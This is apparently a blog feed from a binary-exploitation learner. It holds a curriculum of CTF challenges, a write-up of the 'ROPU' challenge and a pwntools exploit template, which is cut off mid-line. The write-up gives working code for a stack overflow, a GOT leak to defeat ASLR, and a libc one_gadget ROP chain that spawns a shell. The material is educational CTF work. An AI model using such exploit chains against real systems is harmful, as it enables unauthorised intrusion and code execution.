<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>Pwn Path</title>
      <link href="/Path/"/>
      <url>/Path/</url>
      <content type="html"><![CDATA[<p>I’ve been learning the basics of reverse engineering and binary exploitation for almost a year now. While I don’t consider myself an expert, I’ve learned more than I thought possible for myself in a short time. One of the problems I’ve had was finding good problem sets designed for learning with increasing steps of difficulty. So, I’m creating my own series of challenges curated from various sources that provide a good progression of difficulty for anyone interested in binary exploitation.</p><p>Note that I give a solution description for each challenge. These challenges are not meant for you to frustrate yourself with finding vulnerabilities - you’ll eventually be able to do that after playing with a binary and it’ll just waste your time while you’re learning. Here, anyone who wants to learn a specific exploitation technique can refer to a sample problem and learn by doing.</p><h2 id="Level-0-Reverse-Engineering-with-IOLI"><a href="#Level-0-Reverse-Engineering-with-IOLI" class="headerlink" title="Level 0: Reverse Engineering with IOLI"></a>Level 0: Reverse Engineering with IOLI</h2><p>The IOLI crackmes are the best place to start if you have zero experience with looking at binaries. A crackme is a challenge in which you are given a compiled program that requires a password. Usually, we aren’t given the program source code so we have to figure out what the necessary input is from the assembly instructions in the binary.</p><p>In each of the IOLI crackmes, the binary will ask the user for a password and then print whether or not that password was correct. Our goal is to reverse engineer the correct passwords and gain access. Personally, I only think it’s worth doing these challenges until crackme0x07 since the solutions can get repetitive.</p><table><thead><tr><th>Challenge</th><th>Description</th></tr></thead><tbody><tr><td>crackme0x00a</td><td>Hardcoded string comparison</td></tr><tr><td>crackme0x00b</td><td>Interesting hardcoded string comparison</td></tr><tr><td>crackme0x01</td><td>Hardcoded integer comparison</td></tr><tr><td>crackme0x02</td><td>Using GDB to avoid long computations</td></tr><tr><td>crackme0x03</td><td>String obfuscation and educated guessing</td></tr><tr><td>crackme0x04</td><td>Operations on string characters</td></tr><tr><td>crackme0x05</td><td>Bitwise operations</td></tr><tr><td>crackme0x06</td><td>Environment variables</td></tr><tr><td>crackme0x07</td><td>Stripped symbols</td></tr></tbody></table><p>Download: <a href="challenges/crackmes.tar.gz">crackmes.tar.gz</a></p><p>Original: <a href="http://security.cs.rpi.edu/courses/binexp-spring2015/lectures/2/challenges.zip" target="_blank" rel="noopener">challenges.zip</a></p><h2 id="Level-1-Buffer-Overflows"><a href="#Level-1-Buffer-Overflows" class="headerlink" title="Level 1: Buffer Overflows"></a>Level 1: Buffer Overflows</h2><p>Now that you have a basic understanding of assembly language, static analysis, and debugging, you are ready to learn about buffer overflows. In a buffer overflow, you provide more data to a program than can fit in a specified buffer - causing the program to overwrite important data on the stack such as local variables and saved instruction pointers.</p><table><thead><tr><th>Challenge</th><th>Description</th></tr></thead><tbody><tr><td>MBE Lab 2C</td><td>Controlling stack variables</td></tr><tr><td>MBE Lab 2B</td><td>Calling functions with arguments</td></tr><tr><td>MBE Lab 2A</td><td>Call a function in a weird way</td></tr></tbody></table><p>These challenges and many of the future ones come from RPISEC’s Modern Binary Exploitation course. I highly recommend you go through their slides prior to attempting these challenges. They give you detailed explanations on how the exploits work and even provide useful commands.</p><p><a href="https://github.com/RPISEC/MBE/releases/download/v1.1_release/MBE_lectures.tar.gz" target="_blank" rel="noopener">PDFs of MBE Lectures</a></p><p><a href="https://github.com/RPISEC/MBE/releases/download/v1.1_release/MBE_release.tar.gz" target="_blank" rel="noopener">Compiled MBE Binaries</a></p><h2 id="Level-2-Shellcoding"><a href="#Level-2-Shellcoding" class="headerlink" title="Level 2: Shellcoding"></a>Level 2: Shellcoding</h2><p>In the previous challenges, there was always a “shell” function that you just could call which would give you a shell. However, there’s almost never a random shell function lying around in a real program.</p><p>Shellcoding is the art of writing instructions you want to execute on the stack, and then overwriting the return address pointer to point to the shellcode you wrote. Note that shellcode doesn’t necessarily need to spawn a shell; shellcode refers to any executable code that the user provided - even if it’s as simple as printing “Hello World”.</p><p>MBE Lab 3C | Returning to shellcode<br>MBE Lab 3B | Write shellcode that doesn’t spawn a shell<br>MBE Lab 3A | Write non-contiguous shellcode (limited space)</p><h2 id="Level-3-ROP-Emporium"><a href="#Level-3-ROP-Emporium" class="headerlink" title="Level 3: ROP Emporium"></a>Level 3: ROP Emporium</h2><p>These days, shellcoding problems occur less frequently. This is because of a protection built into binaries called “NX bit” or “W^X”. NX stands for no-execute and refers to the fact that that writeable sections of memory must also be non-executable. This way, even if an attacker gains access to the instruction pointer, they can’t redirect execution to code that they wrote since the section that they wrote to will be non-executable.</p><p>However, attackers have come up with ways to bypass this protection in the form of return-oriented programming, or ROP. We still overflow and control the instruction pointer, but now we execute chains of instructions that already exist in the binary’s code or in imported code.</p><p>The majority of these challenges come from ROP Emporium, which I found to be an excellent set of challenges for learning ROP chaining. For more information about each challenge, visit the ROP Emporium website linked below. It will tell you what kind of exploit you need to do and give you hints (which will save you the trouble of having to reverse engineer the problem before beginning the exploit). You should make sure to do both the 32-bit and 64-bit challenges since there are interesting nuances between the architectures that will affect your ROP chains.</p><table><thead><tr><th>Challenge</th><th>Description</th></tr></thead><tbody><tr><td>ret2win</td><td>Controlling $eip</td></tr><tr><td>split</td><td>Calling functions with arguments, both found in the binary</td></tr><tr><td>callme</td><td>Calling exteral functions using the PLT</td></tr><tr><td>write4</td><td>Pass arbitrary arguments to functions that expect pointers by writing to .data</td></tr><tr><td>fluff</td><td>Using more difficult gadget patterns to construct ROP chains</td></tr><tr><td>pivot</td><td>Stack pivoting and adding offsets to get to a new function in libc file. You may want to do this after finishing Level 4.</td></tr></tbody></table><p>Original: <a href="https://ropemporium.com/" target="_blank" rel="noopener">ROP Emporium</a></p><h2 id="Level-4-Format-Strings"><a href="#Level-4-Format-Strings" class="headerlink" title="Level 4: Format Strings"></a>Level 4: Format Strings</h2><p>We’ve been doing relatively simple overflows until now - we just happen to overwrite data on the stack because the program read in more input than it should. What other ways can we control the instruction pointer? Format strings! Format strings are often used with functions like <code>printf</code> to interpret sequences of bytes as integers, or characters, or even pointers. <code>printf</code> doesn’t get passed in the number arguments to it - so if a format string was read as <code>%x%x%x</code> and the user didn’t provide three numbers, then <code>printf</code> just starts reading up the stack and printing out three numbers since it’ll think that those were the arguments to it. You can see the problems that this might cause. There is also a special format string, <code>%n</code>, which will allow you to write to arbitrary regions of memory.</p><p>For more information, read the MBE slides on format strings and check out this excellent <a href="http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html" target="_blank" rel="noopener">tutorial</a>.</p><p>Format string challenges are important but can be a little tricky. You might argue that they are less complicated than ROP challenges, but I think it helps to learn the stack well and understand what memory sections are writeable before learning to exploit format string vulnerabilities. The challenges in this section are from angstromCTF 2018 and include the source code for each binary.</p><table><thead><tr><th>Challenge</th><th>Description</th></tr></thead><tbody><tr><td>Number Guess</td><td>Leak private local variables</td></tr><tr><td>Letter</td><td>Use <code>%n</code> to overwrite data in arbitrary memory locations</td></tr></tbody></table><p>Download: <a href="challenges/format_strings.tar.gz">format_strings.tar.gz</a></p><h2 id="Level-5-Gadgets-in-Shared-Objects-amp-Defeating-ASLR"><a href="#Level-5-Gadgets-in-Shared-Objects-amp-Defeating-ASLR" class="headerlink" title="Level 5: Gadgets in Shared Objects &amp; Defeating ASLR"></a>Level 5: Gadgets in Shared Objects &amp; Defeating ASLR</h2><p>Until now with the ROP Emporium challenges, we’ve been solely using gadgets found in the binary that we’re running. However, you can also use gadgets found in the linked shared object files such as libc.so. In fact, this will usually make your exploits easier because there are so many gadgets in the libc shared object.</p><p>There is a catch though - it is slightly more work to ROP chain using the shared objects. Shared objects are compiled with a protection known as PIE, which stands for Position Independent Execution. If you look at a shared object file in a disassembler, you’ll see that each instruction’s address is something like <code>0x00000xxx</code>. This indicates that the .so file was compiled with PIE. When the shared object is loaded and run, the operating system chooses a random base address and all the address in the shared object are referenced by <code>random_base + 0x00000xxx</code>. This is known as ASLR.</p><p>When an operating system has ASLR enabled and a binary is compiled with PIE, you can’t just jump to a fixed gadget addresses found in the binary and expect the jump to work. This is because the shared object’s base address will be randomized during the load time of the library. So how can we defeat this protectoin?</p><p>Well, the offsets within the library remain the same between runs even if the base addresses are different. Therefore, if you know the full address of any function, you can use the offsets in the .so file to calculate the address of any other function in that shared object. Getting the address of any function in the PLT is known as a leak.</p><p>The reason we haven’t had to deal with ASLR in the ROP Emporium challenges (even though ASLR was enabled!) is that we only looked for gadgets in the binary itself. Those binaries were not compiled with PIE (position independent execution), so ASLR didn’t affect them. Shared objects are always compiled with PIE, so ASLR affects them. If we had compiled the binaries in ROP Emporium with PIE, then you’d have to do the same kind of leak as discussed before to get the addresses of the gadgets before being able to jump to them. After leaking, the process is the same as usual for constructing a ROP chain.</p><table><thead><tr><th>Challenge</th><th>Description</th></tr></thead><tbody><tr><td>ROPU</td><td>Leak an address using puts, then jump to a target from one-gadget.</td></tr><tr><td>Ropasaurus Rex</td><td>Another leak but slightly more difficult (uses read() / write())</td></tr><tr><td>scv</td><td>Leak a stack canary using format strings</td></tr></tbody></table><h2 id="Solutions"><a href="#Solutions" class="headerlink" title="Solutions"></a>Solutions</h2><p>I’m working on creating a set of solutions for each of these challenges. Once it’s done, I’ll post it here.</p>]]></content>
      
      
        <tags>
            
            <tag> Binary Exploitation </tag>
            
            <tag> Reverse Engineering </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Defeating ASLR With a Leak</title>
      <link href="/Defeating-ASLR-with-a-Leak/"/>
      <url>/Defeating-ASLR-with-a-Leak/</url>
      <content type="html"><![CDATA[<h2 id="ROPU-Writeup"><a href="#ROPU-Writeup" class="headerlink" title="ROPU Writeup"></a>ROPU Writeup</h2><p><i class="fas fa-flag"></i> GOT address leak to calculate libc base and jump to one_gadget address<br><i class="fas fa-download"></i> <a href="challenge.tar.gz">challenge.tar.gz</a><br><i class="fas fa-download"></i> <a href="solve.py">Solution</a></p><p>This is a CTF problem from UMBC’s 2018 Spring CTF. There were only two solves on this challenge including our own team, despite it not being too difficult, so I figured this would be a good problem to do a writeup for.</p><h3 id="Controlling-rip"><a href="#Controlling-rip" class="headerlink" title="Controlling $rip"></a>Controlling $rip</h3><p>We are given two files:<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line">libc-2.23.so  ROPU</span><br></pre></td></tr></table></figure></p><p>One is a binary, and the other is a libc file. So, we copy in our <a href="/binexploit-init">exploit initialization script</a>, mark the binary executable with <code>chmod +x ROPU</code>, and run it.<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./ROPU</span><br><span class="line">Enter the payload!</span><br><span class="line">banana</span><br><span class="line">banana%</span><br></pre></td></tr></table></figure></p><p>The program seems to be very simple. It reads some input into a buffer and calls <code>printf</code> on that buffer. We can verify this by opening the binary in IDA and viewing the <code>getInput</code> function.</p><img src="/Defeating-ASLR-with-a-Leak/getInput.png"><p>Great! We can see that the input function is <code>gets</code>, which we know is insecure. <code>gets</code> doesn’t stop reading input until a <code>\n</code> character is entered, which it replaces with a null-byte. The buffer is 0x20 bytes large according to IDA, so we can easily overflow the input buffer and control the instruction pointer.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./ROPU</span><br><span class="line">Enter the payload!</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[1]    31000 segmentation fault (core dumped)  ./ROPU</span><br></pre></td></tr></table></figure><p>To find the exact offset of the return address on the stack, I use the following lines in my script.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(cyclic(<span class="number">100</span>, n=<span class="number">8</span> <span class="keyword">if</span> x64 <span class="keyword">else</span> <span class="number">4</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p>This generates a De Bruijn sequence of characters that we can use to identify offsets and sends it to the stdin of the program. After running it, we get the following output.</p><img src="/Defeating-ASLR-with-a-Leak/pattern_offset.png"><p>After the program read the input, it continued and eventually segfaulted. Note that the binary didn’t actually run the <code>ret</code> instruction. In 64-bit binaries, the binary actually segfaults before it runs the segfaulting instruction. In this case, we segfault because we are trying to pop <code>faaaaaaa</code> into the $rip. This string is part of the De Bruijn sequence that we inputted. Using pwntools, we can figure out the offset in the sequence where this string occurs, and create a string exactly that large.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buf = cyclic_find(<span class="string">'faaaaaaa'</span>, n=<span class="number">8</span>) * <span class="string">'a'</span></span><br></pre></td></tr></table></figure></p><h3 id="Address-Resolution-in-Shared-Objects"><a href="#Address-Resolution-in-Shared-Objects" class="headerlink" title="Address Resolution in Shared Objects"></a>Address Resolution in Shared Objects</h3><p>Now that we can control the instruction pointer, we need to figure out how we can run an arbitrary sequence of instructions to open a shell.</p><p>After running <code>checksec</code> on the binary, we notice that NX is enabled and there is no stack canary.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ checksec ROPU</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>Having NX enabled means we can’t just write shellcode and jump to it on the stack. Therefore, we’ll have to construct a ROP chain.</p><p>Unfortunately, the binary is so small that we’d have to come up with a clever ROP chain to use the gadgets within the binary to give us a shell. Since we are lazy, and since the binary is dynamically linked, let’s instead see if we can construct a ROP chain using the numerous gadgets in the libc file.</p><p>In order to construct a ROP chain using those gadgets, we need to leak the address of a function in the libc file from the GOT. This is because on a system with ASLR enabled, we can’t just jump to a hard-coded address in the shared object file. For a detailed explanation, see <a href="#Dynamic-Linking-with-Shared-Objects">Dynamic Linking with Shared Objects</a>.</p><h3 id="Defeating-ASLR-with-a-Leak"><a href="#Defeating-ASLR-with-a-Leak" class="headerlink" title="Defeating ASLR with a Leak"></a>Defeating ASLR with a Leak</h3><p>Let’s say we found out that <code>printf</code> is located at address <code>0x08048bca</code>. Let’s also assume that in the libc file, there is a shell function 0x30 bytes away from the beginning of the <code>printf</code> function. Then, we know that the shell function is located at <code>0x08048bca + 0x30</code> in the randomized memory too. This is because the whole address isn’t randomized - only the base <code>0x08048</code> is. The offsets between functions in the shared object will remain constant between the file and when it’s loaded into memory at runtime.</p><p>In order to leak an address from the GOT, let’s call the <code>puts</code> function with argument the address we want to leak. Since we are calling <code>puts</code>, we can be sure that GOT[‘puts’] will have an entry, so we’ll just leak that.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buf = cyclic_find(<span class="string">'faaaaaaa'</span>, n=<span class="number">8</span>) * <span class="string">'a'</span> <span class="comment"># 40 bytes</span></span><br><span class="line">buf += p64(e.plt[<span class="string">'puts'</span>]) <span class="comment"># Return address - call the puts function</span></span><br><span class="line">buf += p64(e.got[<span class="string">'puts'</span>]) <span class="comment"># Argument to puts - GOT['puts']</span></span><br></pre></td></tr></table></figure><p>There is a small mistake above though. In a 64-bit binary, arguments are passed into registers before the stack (see <a href="https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64" target="_blank" rel="noopener">here</a>). Therefore, we will need to first pop the argument (GOT[‘puts’]) into $rdi, and only then can we call <code>puts</code>.</p><p>I used <a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">ROPgadget</a> to search for gadgets within the binary that pop into $rdi</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ROPU | less</span><br></pre></td></tr></table></figure><p>In the output, I found the following:</p><img src="/Defeating-ASLR-with-a-Leak/pop_rdi.png"><p>So, by ropping to address 0x0000000000400783, we can pop the argument for <code>puts</code> into $rdi, and then call <code>puts</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi = <span class="number">0x0000000000400783</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">buf = cyclic_find(<span class="string">'faaaaaaa'</span>, n=<span class="number">8</span>) * <span class="string">'a'</span> <span class="comment"># 40 bytes</span></span><br><span class="line">buf += p64(pop_rdi) <span class="comment"># First call pop_rdi to pop got['puts'] into $rdi</span></span><br><span class="line">buf += p64(e.got[<span class="string">'puts'</span>])</span><br><span class="line">buf += p64(e.plt[<span class="string">'puts'</span>]) <span class="comment"># Now actually call puts</span></span><br><span class="line">buf += p64(e.symbols[<span class="string">'main'</span>]) <span class="comment"># Run the binary again</span></span><br><span class="line">p.sendline(buf)</span><br></pre></td></tr></table></figure><p>Now, when the program runs, it will print “Enter the payload!”, read in our ROP chain, call <code>printf</code> to echo back our input like usual, and finally call <code>puts</code> to print the value in GOT[‘puts’] to stdout. We can capture that output and use it to calculate the base address of libc as follows.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Receive the GOT address of puts</span></span><br><span class="line">leaked_puts = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">log.info(<span class="string">'Address of puts: '</span> + hex(leaked_puts))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Compute libc base</span></span><br><span class="line">libc_base = leaked_puts - libc.symbols[<span class="string">'puts'</span>]</span><br></pre></td></tr></table></figure><p>In line two, I received 6 bytes from the process - which is the amount of bytes of any address in a 64-bit binary. You might think it should be 8 bytes, but even 64-bit CPUs only use 48-bit addresses today. Before I can unpack the 6 bytes into an integer, I have to pad it with bytes until it is 64-bits long for the <code>u64</code> function to decode it.</p><p>Now that we have the libc base, we can jump to any gadget we want to in the libc file! But wait - we already sent our payload! Where do we send the new addresses in the libc file that we want to jump to? Well, we can send another payload by just running the binary again from <code>main</code>. The binary hasn’t quit yet, so the offsets and base addresses will all remain the same.</p><h3 id="Shell-Gadget"><a href="#Shell-Gadget" class="headerlink" title="Shell Gadget"></a>Shell Gadget</h3><p>Using a tool called <a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener">one_gadget</a>, we can search for a single gadget that gives us a shell in the libc.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ one_gadget <span class="string">"libc-2.23.so"</span></span><br><span class="line">0x45216 execve(<span class="string">"/bin/sh"</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(<span class="string">"/bin/sh"</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(<span class="string">"/bin/sh"</span>, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(<span class="string">"/bin/sh"</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure><p>Note that while <code>one_gadget</code> found several for us, it does impose constraints on each gadget that must be met before the gadget is called. I will use the first gadget since it is the simplest - but before I can use it, I need to ensure that $rax = 0. I do this by searching for gadgets that pop values into $rax using ROPgadget as I did before. I couldn’t find a simple one in the binary itself, but when I ran it on the libc file, I found a simple <code>pop $rax; ret;</code> so I decided to use that. Immediately after, we can use the <code>one_gadget</code> gadget to give us a shell.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">shell = <span class="number">0x45216</span> <span class="comment"># Condition: rax = NULL</span></span><br><span class="line">pop_rax = <span class="number">0x0000000000033544</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Send payload two</span></span><br><span class="line">buf = cyclic_find(<span class="string">'faaaaaaa'</span>, n=<span class="number">8</span>) * <span class="string">'a'</span> <span class="comment"># 40 bytes</span></span><br><span class="line">buf += p64(pop_rax + libc_base)</span><br><span class="line">buf += p64(<span class="number">0</span>)</span><br><span class="line">buf += p64(shell + libc_base)</span><br><span class="line">buf += p64(libc.symbols[<span class="string">'exit'</span>] + libc_base)</span><br><span class="line">p.sendline(buf)</span><br></pre></td></tr></table></figure><p>Line 9 is unnecessary for the exploit to work, but it does let the program exit gracefully once the shell completes.</p><p><a href="solve.py">Here</a> is our final exploit code. After running it, we get the following.</p><img src="/Defeating-ASLR-with-a-Leak/success.png"><p>Awesome, we got a shell!</p><h3 id="Dynamic-Linking-with-Shared-Objects"><a href="#Dynamic-Linking-with-Shared-Objects" class="headerlink" title="Dynamic Linking with Shared Objects"></a>Dynamic Linking with Shared Objects</h3><p>To understand why we need to leak an address, we need to understand how code from shared objects is run. When ASLR is enabled on an operating system, every time a program runs, the address of each function it uses from a shared object is randomized.</p><p>Any program that wants to use code from a shared object needs to know where the code is located so it can be jumped to. However, if that location changes every time the program is run, then the program can’t hard code a location to jump to (i.e. it can’t say “oh you want to call <code>printf</code>? That code is always located at address 0x08048cba, just jump there”). So there needs to be a way to get the address at runtime. The image below explains how this is accomplished.</p><img src="/Defeating-ASLR-with-a-Leak/plt_got.png"><p>The dynamic linker fills in a data structure with the addresses of each function in the shared object. This data structure is known as the Global Offset Table, and might look like the following.</p><table><thead><tr><th>Function</th><th>Address</th></tr></thead><tbody><tr><td><code>puts</code></td><td>Random virtual address of <code>puts</code></td></tr><tr><td><code>printf</code></td><td>Random virtual address of <code>printf</code></td></tr><tr><td>…</td><td>…</td></tr></tbody></table><p>All the program needs to do is read the appropriate entry in the GOT and jump to it. But how does it know which entry in the GOT to read? It does this using something called the PLT.</p><ol><li>When a binary calls a function from a shared object, it jumps to some code in the PLT.</li><li>The PLT is a table full of chunks of instructions appended together. Each entry in the PLT does the following:<ul><li>Read an address from the GOT.</li><li>Jump to that address.</li></ul></li></ol><p>So the PLT looks something like this.</p><table><thead><tr><th>Function</th><th>Instructions</th></tr></thead><tbody><tr><td><code>puts</code></td><td>Code to lookup the <code>puts</code> address and call it.</td></tr><tr><td><code>printf</code></td><td>Code to lookup the <code>printf</code> address and call it.</td></tr><tr><td>…</td><td>…</td></tr></tbody></table><p>Awesome, we now know how programs jump to random function addresses! They just use the code in the PLT, which reads the random address from the GOT and jumps to it.</p><p>How does the GOT get its values filled in? The dynamic linker takes care of that for us, so we don’t care too much. However, it IS important to realize that the values in the GOT are initially empty. The GOT is only filled with the appropriate addresses after the first time that the function has been called. Before that, each entry in the GOT contains the address of something called a resolver.</p><p>If it’s the first time that a function has been called, the PLT code reads the address of the resolver from the GOT and jumps to it. The resolver fills in the GOT entry and then jumps to the real function address. After this initialization, we never need to call the resolver for this function again since the GOT entry has been filled. So really, our diagram should look like this.</p><img src="/Defeating-ASLR-with-a-Leak/dynamic_linking.jpg">]]></content>
      
      
        <tags>
            
            <tag> Binary Exploitation </tag>
            
            <tag> ASLR </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Binary Exploit Initscript</title>
      <link href="/binexploit-init/"/>
      <url>/binexploit-init/</url>
      <content type="html"><![CDATA[<p>Binary exploit problems generally involve sending data to a binary and interpreting the output. This script uses the pwntools framework to automate much of the setup.</p><ol><li>Fill in the binary name, libc name, and whatever variables are needed for the remote binary.</li><li>Start a tmux window. The tmux window will split into two after the script runs - the left will have your binary’s output, and the right will have GDB.</li><li>Run <code>python run.py --&lt;mode&gt;</code> where mode indicates how you want to run the binary. Not putting a mode automatically runs the binary in GDB.</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># cmdline argument - how to connect to binary</span></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">"--local"</span>, help=<span class="string">"Run exploit locally"</span>, action=<span class="string">"store_true"</span>)</span><br><span class="line">parser.add_argument(<span class="string">"--attach"</span>, help=<span class="string">"Run exploit locally and attach debugger"</span>, action=<span class="string">"store_true"</span>)</span><br><span class="line">parser.add_argument(<span class="string">"--remote"</span>, help=<span class="string">"Run exploit on remote service"</span>, action=<span class="string">"store_true"</span>)</span><br><span class="line">parser.add_argument(<span class="string">"--ssh"</span>, help=<span class="string">"Run exploit on SSH server"</span>, action=<span class="string">"store_true"</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="comment"># GDB commands</span></span><br><span class="line">debugging = <span class="keyword">False</span></span><br><span class="line">gdb_cmd = [</span><br><span class="line"><span class="string">"c"</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Binary names</span></span><br><span class="line">bin_fname = <span class="string">''</span></span><br><span class="line">libc_fname = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Remote</span></span><br><span class="line">IP = <span class="string">''</span></span><br><span class="line">PORT = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SSH</span></span><br><span class="line">URL = <span class="string">''</span></span><br><span class="line">username = <span class="string">''</span></span><br><span class="line">password = <span class="string">''</span></span><br><span class="line">bin_abs_path = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create ELF objects</span></span><br><span class="line">e = ELF(bin_fname)</span><br><span class="line">libc = ELF(libc_fname) <span class="keyword">if</span> libc_fname <span class="keyword">else</span> <span class="keyword">None</span></span><br><span class="line">x64 = e.bits != <span class="number">32</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Command line args</span></span><br><span class="line"><span class="comment"># e.g. arg1 = cyclic_find('ahaa') * 'a' + '\xbd\x86\x04\x08' + 'a' * 4 + p32(next(e.search('/bin/sh')))</span></span><br><span class="line">arg1 = <span class="string">''</span></span><br><span class="line">proc_args = [bin_fname, arg1]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.remote:</span><br><span class="line">p = remote(IP, PORT)</span><br><span class="line"><span class="keyword">elif</span> args.local <span class="keyword">or</span> args.attach:</span><br><span class="line">p = process(proc_args)</span><br><span class="line"><span class="keyword">if</span> args.attach:</span><br><span class="line">gdb.attach(p, gdbscript=<span class="string">"\n"</span>.join(gdb_cmd))</span><br><span class="line"><span class="keyword">elif</span> args.ssh:</span><br><span class="line">s = ssh(host=URL, user=username, password=password)</span><br><span class="line">s.set_working_directory(bin_abs_path)</span><br><span class="line">p = s.process(proc_args)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = gdb.debug(proc_args, gdbscript=<span 